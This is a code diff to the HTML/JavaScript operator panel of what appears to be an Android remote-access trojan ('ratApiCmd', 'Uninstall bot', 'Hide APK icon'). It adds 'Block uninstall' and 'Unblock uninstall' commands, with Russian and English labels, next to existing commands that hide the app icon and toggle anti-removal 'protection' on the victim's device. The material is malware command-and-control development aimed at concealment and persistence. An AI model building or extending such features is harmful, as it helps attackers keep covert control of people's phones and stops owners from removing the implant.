@@ -2264,10 +2264,12 @@
                     <div class="section-title"><i data-feather="shield"></i> <span data-i18n="cmd_protection_section">Защита от удаления</span></div>
                     <div style="font-size:0.6rem;color:var(--text-dim);margin-bottom:6px;padding:0 2px;" data-i18n="cmd_protection_desc">Защита включена автоматически. Отключите перед удалением.</div>
                     <div class="action-grid">
-                        <button class="action-btn success" onclick="ratApiCmd('hide_icon')"><i data-feather="shield"></i><span data-i18n="cmd_hide_icon">Скрыть иконку</span></button>
-                        <button class="action-btn" onclick="ratApiCmd('show_icon')"><i data-feather="shield-off"></i><span data-i18n="cmd_show_icon">Показать иконку</span></button>
+                        <button class="action-btn success" onclick="ratApiCmd('hide_icon')"><i data-feather="shield-off"></i><span data-i18n="cmd_hide_icon">Скрыть иконку</span></button>
+                        <button class="action-btn" onclick="ratApiCmd('show_icon')"><i data-feather="shield"></i><span data-i18n="cmd_show_icon">Показать иконку</span></button>
                         <button class="action-btn success" onclick="ratApiCmd('enable_protection')"><i data-feather="shield"></i><span data-i18n="cmd_enable_protection">Включить защиту</span></button>
                         <button class="action-btn danger" onclick="ratApiCmd('disable_protection')"><i data-feather="shield-off"></i><span data-i18n="cmd_disable_protection">Выключить защиту</span></button>
+                        <button class="action-btn success" onclick="ratApiCmd('enable_sett_block')"><i data-feather="lock"></i><span data-i18n="cmd_enable_sett_block">Блок. удаление</span></button>
+                        <button class="action-btn danger" onclick="ratApiCmd('disable_sett_block')"><i data-feather="unlock"></i><span data-i18n="cmd_disable_sett_block">Разблок. удаление</span></button>
                         <button class="action-btn" onclick="ratApiCmd('protection_status')"><i data-feather="info"></i><span data-i18n="cmd_protection_status">Статус защиты</span></button>
                         <button class="action-btn danger" onclick="if(confirm(L('confirm_uninstall')))ratApiCmd('self_uninstall')"><i data-feather="trash-2"></i><span data-i18n="cmd_uninstall_bot">Удалить бота</span></button>
                     </div>
@@ -2472,6 +2474,8 @@
                 cmd_show_icon: 'Показать иконку APK',
                 cmd_enable_protection: 'Включить защиту',
                 cmd_disable_protection: 'Выключить защиту',
+                cmd_enable_sett_block: 'Блокировать удаление',
+                cmd_disable_sett_block: 'Разблокировать удаление',
                 cmd_protection_status: 'Статус защиты',
                 cmd_uninstall_bot: 'Удалить бота',
                 confirm_uninstall: 'Полностью удалить бота с устройства?',
@@ -2886,6 +2890,8 @@
                 cmd_show_icon: 'Show icon APK',
                 cmd_enable_protection: 'Enable protection',
                 cmd_disable_protection: 'Disable protection',
+                cmd_enable_sett_block: 'Block uninstall',
+                cmd_disable_sett_block: 'Unblock uninstall',
                 cmd_protection_status: 'Protection status',
                 cmd_uninstall_bot: 'Uninstall bot',
                 confirm_uninstall: 'Completely remove bot from device?',
